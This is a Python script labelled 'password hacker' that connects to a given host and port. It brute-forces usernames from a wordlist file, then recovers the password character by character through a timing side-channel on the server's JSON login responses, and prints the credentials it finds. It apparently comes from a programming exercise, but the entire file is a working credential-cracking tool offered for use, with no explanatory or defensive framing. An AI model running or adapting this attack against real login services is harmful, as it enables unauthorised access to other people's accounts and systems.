import argparse
import itertools
import socket
import time

#
# ██████╗░░█████╗░░██████╗░██████╗░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░      ██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
# ██╔══██╗██╔══██╗██╔════╝██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗      ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
# ██████╔╝███████║╚█████╗░╚█████╗░░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░██║      ███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
# ██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░██║      ██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
# ██║░░░░░██║░░██║██████╔╝██████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝      ██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
# ╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░      ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
#
# N33d a f1le w1th u53rnam35 in the w0rk1ng d1r3ct0ry
# Usage: python hack.py <HOST> <PORT>


def get_login():
    with open('logins.txt') as login_file:
        for line in login_file:
            word = line.rstrip()
            yield word


def get_symbol():
    numbers = [chr(i) for i in range(48, 58)]
    big_letters = [chr(i) for i in range(65, 91)]
    low_letters = [chr(i) for i in range(97, 123)]
    while True:
        my_iter = itertools.chain(numbers, big_letters, low_letters)
        for i in my_iter:
            yield i


parser = argparse.ArgumentParser()
parser.add_argument("host", help="Enter IP address")
parser.add_argument("port", help="Enter port from 1024 to 65535")

args = parser.parse_args()

ip_address = args.host
port = int(args.port)
address = (ip_address, port)
login = get_login()
symbol_in_pass = get_symbol()
response = ""

with socket.socket() as client_socket:
    client_socket.connect(address)

    total_time = 0
    while total_time < 0.09:
        current_login = next(login)
        data = '{"login": "' + current_login + '", "password": ""}'
        start = time.perf_counter()
        client_socket.send(data.encode())
        response = client_socket.recv(1023).decode()
        end = time.perf_counter()
        total_time = end - start

    found_pass = " "
    checked_symbol = next(symbol_in_pass)

    total_time = 0
    while response != '{"result": "Connection success!"}':
        data = '{"login": "' + current_login + '", "password": "' + found_pass + '"}'
        start = time.perf_counter()
        client_socket.send(data.encode())
        response = client_socket.recv(1024).decode()
        end = time.perf_counter()
        total_time = end - start
        if total_time < 0.09:
            checked_symbol = next(symbol_in_pass)
            found_pass = found_pass[:-1] + checked_symbol
        else:
            found_pass += next(symbol_in_pass)

    print(data)
